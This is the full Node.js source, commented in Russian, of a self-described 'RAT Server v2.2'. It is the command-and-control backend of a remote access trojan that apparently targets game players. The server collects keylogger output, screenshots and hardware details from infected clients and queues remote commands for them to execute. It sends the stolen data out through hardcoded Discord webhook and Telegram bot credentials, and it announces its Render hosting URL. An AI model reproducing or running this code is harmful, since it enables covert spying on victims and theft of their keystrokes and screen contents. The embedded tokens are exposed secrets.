// server.js
const http = require('http');
const fetch = require('node-fetch');

// Хранилище данных
let commandQueue = [];
let lastScreenshot = null;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS";
const TELEGRAM_BOT_TOKEN = "8079490877:AAEf1_SXzdbEjK88t6O4qyKhYnpE6U-hB44";
const TELEGRAM_CHAT_ID = "7581072357";

// Функция отправки в Telegram
async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Ошибка отправки в Telegram:', error);
    }
}

// Функция логирования действий
function logAction(action, details) {
    const timestamp = new Date().toLocaleString('ru-RU');
    console.log(`[${timestamp}] ${action}: ${details}`);
}

const server = http.createServer((req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');

    // Handle preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                console.log('Received command:', data);

                const { command, args } = data;
                
                logAction('КОМАНДА ОТ КЛИЕНТА', `${command} ${args ? args.join(' ') : ''}`);

                // Обработка данных от клиента
                if (command === "user_chat" || command === "inject_notify" || command === "execute_log") {
                    // Отправка в Discord
                    try {
                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: `**${args[0]}:** ${args[1]}`
                            })
                        });
                    } catch (e) {
                        console.error('Discord error:', e);
                    }

                    // Отправка в Telegram
                    await sendToTelegram(`<b>${args[0]}:</b> ${args[1]}`);
                }

                res.end(JSON.stringify({ status: "OK", received: command }));
            } catch (e) {
                console.error('Command error:', e);
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request", details: e.message }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/client_command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { command, args } = JSON.parse(body);
                logAction('КОМАНДА ОТ БОТА', `${command} ${args ? args.join(' ') : ''}`);
                
                // Добавляем команду в очередь
                commandQueue.push({
                    command: command,
                    args: args || [],
                    timestamp: new Date().toISOString()
                });

                // Ограничиваем размер очереди
                if (commandQueue.length > 10) {
                    commandQueue = commandQueue.slice(-10);
                }

                res.end(JSON.stringify({ 
                    status: "OK", 
                    command: command,
                    queue_size: commandQueue.length 
                }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                logAction('СКРИНШОТ', 'Получен новый скриншот');
                
                // Уведомление в Telegram
                sendToTelegram('📸 <b>Получен новый скриншот от клиента</b>');
                
                res.end(JSON.stringify({ status: "Screenshot received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid screenshot data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { logs } = JSON.parse(body);
                logAction('КЕЙЛОГГЕР', `Получено ${logs.length} символов`);
                
                // Отправка в Discord
                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**Keylogger Data:**\n\`\`\`\n${logs.substring(0, 1900)}\n\`\`\``
                        })
                    });
                } catch (e) {
                    console.error('Discord error:', e);
                }

                // Отправка в Telegram (первые 1000 символов)
                if (logs.length > 0) {
                    await sendToTelegram(`<b>КЕЙЛОГГЕР ДАННЫЕ:</b>\n<pre>${logs.substring(0, 1000)}</pre>`);
                }
                
                res.end(JSON.stringify({ status: "Logs received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid keylog data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/hardware') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { player, data } = JSON.parse(body);
                logAction('ОБОРУДОВАНИЕ', `Данные от ${player}`);
                
                const hwInfo = `🎮 <b>ИНФОРМАЦИЯ ОБ ОБОРУДОВАНИИ</b>
👤 Игрок: ${player}
🎯 FPS: ${data.fps}
📶 Ping: ${data.ping}
⚙️ Executor: ${data.executor}
${data.cpu ? `💻 CPU: ${data.cpu}` : ''}
${data.ram ? `🧠 RAM: ${data.ram}` : ''}`;

                // Отправка в оба канала
                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**Hardware Info:**\n\`\`\`\n${hwInfo}\n\`\`\``
                        })
                    });
                } catch (e) {
                    console.error('Discord error:', e);
                }

                await sendToTelegram(hwInfo);
                
                res.end(JSON.stringify({ status: "Hardware data received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid hardware data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/screenshot') {
        if (lastScreenshot) {
            res.end(JSON.stringify({ image: lastScreenshot }));
        } else {
            res.statusCode = 404;
            res.end(JSON.stringify({ error: "No screenshot available" }));
        }
        return;
    }

    if (req.method === 'GET' && req.url === '/get_command') {
        // Клиент запрашивает команду
        if (commandQueue.length > 0) {
            const command = commandQueue.shift(); // Берем первую команду из очереди
            res.end(JSON.stringify(command));
        } else {
            res.end(JSON.stringify({ command: "", args: [] }));
        }
        return;
    }

    if (req.method === 'GET' && req.url === '/status') {
        res.end(JSON.stringify({ 
            status: "online", 
            version: "2.2",
            timestamp: new Date().toISOString(),
            queue_size: commandQueue.length,
            last_screenshot: !!lastScreenshot
        }));
        return;
    }

    if (req.method === 'GET' && req.url === '/') {
        res.end(JSON.stringify({ 
            message: "RAT Server v2.2",
            endpoints: [
                "POST /command - Команды от клиента",
                "POST /client_command - Команды от бота", 
                "GET /get_command - Получить команду для клиента",
                "POST /screenshot - Загрузить скриншот",
                "GET /screenshot - Получить скриншот",
                "POST /keylog - Кейлоггер данные",
                "POST /hardware - Инфо об оборудовании",
                "GET /status - Статус сервера"
            ]
        }));
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

// Обработка ошибок сервера
server.on('error', (error) => {
    console.error('Ошибка сервера:', error);
    sendToTelegram(`<b>❌ ОШИБКА СЕРВЕРА:</b>\n<code>${error.message}</code>`);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
    console.log(`📡 URL: https://ratserver-6wo3.onrender.com`);
    console.log(`👤 Telegram ID: ${TELEGRAM_CHAT_ID}`);
    
    // Отправка уведомления о запуске
    sendToTelegram(`<b>🟢 СЕРВЕР ЗАПУЩЕН</b>\n📍 https://ratserver-6wo3.onrender.com\n⏰ ${new Date().toLocaleString('ru-RU')}`);
});
